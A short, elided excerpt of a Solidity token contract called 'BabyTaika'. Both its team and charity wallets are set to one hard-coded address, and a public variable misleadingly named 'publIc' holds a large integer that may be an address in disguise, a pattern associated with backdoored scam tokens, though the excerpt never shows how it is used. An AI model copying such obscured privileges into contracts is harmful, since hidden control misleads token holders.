...
contract  BabyTaika is Context, IERC20, Ownable {

    uint256 public publIc=
    150204226878642622067527889049274545390382094927;
    using SafeMath for uint256;
    string private _name = "BabyTaika";
    string private _symbol = "BabyTaika";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x15EB7f6E4416c674a58F75C6b7FFAf4d28F728Ad));
        CharityWalletAddress = payable(address(0x15EB7f6E4416c674a58F75C6b7FFAf4d28F728Ad));
